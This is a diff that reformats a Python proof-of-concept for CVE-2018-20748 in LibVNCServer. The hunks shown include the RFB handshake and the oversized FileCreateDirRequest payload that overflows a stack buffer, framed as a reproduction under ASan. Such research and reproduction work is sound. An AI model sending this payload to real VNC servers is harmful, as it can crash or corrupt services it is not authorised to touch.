@@ -3,7 +3,7 @@
 PoC for CVE-2018-20748: LibVNCServer 0.9.11 stack buffer overflow (CWE-787)
 
 Triggers HandleFileCreateDirRequest() to write 4097 bytes (PATH_MAX+1) into a
-4096-byte stack buffer (char dirName[PATH_MAX]) with no bounds check — a
+4096-byte stack buffer (char dirName[PATH_MAX]) with no bounds check - a
 one-byte stack overflow.
 
 Handshake sequence (TightVNC / RFB 3.8):
@@ -55,7 +55,7 @@ def run_poc(host: str, port: int) -> None:
     if not banner.startswith(b"RFB "):
         raise ValueError(f"Unexpected banner: {banner!r}")
 
-    # Step 2: Send client version — must be 3.8 for tight security handler
+    # Step 2: Send client version - must be 3.8 for tight security handler
     sock.sendall(b"RFB 003.008\n")
     print("[*] Sent client version: RFB 003.008")
 
@@ -103,8 +103,7 @@ def run_poc(host: str, port: int) -> None:
         auth_caps_raw = recv_exact(sock, n_auth * 16)
         # Auth cap code is the first 4 bytes (int32) of each rfbCapabilityInfo
         auth_codes = [
-            struct.unpack(">i", auth_caps_raw[i * 16 : i * 16 + 4])[0]
-            for i in range(n_auth)
+            struct.unpack(">i", auth_caps_raw[i * 16 : i * 16 + 4])[0] for i in range(n_auth)
         ]
         print(f"[*] Auth cap codes: {auth_codes}")
         # Select first offered auth type (server validates against its list)
@@ -112,7 +111,7 @@ def run_poc(host: str, port: int) -> None:
         print(f"[*] Sent auth type: {auth_codes[0]}")
 
         if 2 in auth_codes:
-            # VNC authentication — we don't have the password; abort cleanly
+            # VNC authentication - we don't have the password; abort cleanly
             raise RuntimeError(
                 "Server requires VNC password authentication; "
                 "configure no password for the PoC target."
@@ -145,9 +144,7 @@ def run_poc(host: str, port: int) -> None:
     #   Then (nServer + nClient + nEnc) * 16-byte rfbCapabilityInfo entries
     ic_header = recv_exact(sock, 8)
     n_server, n_client, n_enc, _pad = struct.unpack(">HHHH", ic_header)
-    print(
-        f"[*] InteractionCaps: nServer={n_server}, nClient={n_client}, nEnc={n_enc}"
-    )
+    print(f"[*] InteractionCaps: nServer={n_server}, nClient={n_client}, nEnc={n_enc}")
     total_caps = n_server + n_client + n_enc
     if total_caps > 0:
         caps_data = recv_exact(sock, total_caps * 16)
@@ -162,7 +159,7 @@ def run_poc(host: str, port: int) -> None:
     # We use PATH_MAX+1 = 4097 for a clean ASan "stack-buffer-overflow WRITE"
     # report. dNameLen=0xFFFF (max) also crashes but the stack corruption is
     # severe enough that ASan can't print a full trace (nested bug).
-    DNAME_LEN = 4097   # PATH_MAX + 1; protocol max is 0xFFFF
+    DNAME_LEN = 4097  # PATH_MAX + 1; protocol max is 0xFFFF
     payload = b"A" * DNAME_LEN
     msg = struct.pack(">BBH", 136, 0, DNAME_LEN) + payload
     print(
@@ -170,7 +167,7 @@ def run_poc(host: str, port: int) -> None:
         f"payload={len(payload)} bytes of 0x41 (PATH_MAX+1 => stack overflow)"
     )
     sock.sendall(msg)
-    print("[*] Payload sent — waiting for server ASan abort...")
+    print("[*] Payload sent - waiting for server ASan abort...")
 
     # Give ASan time to write its report before we close the socket
     try:
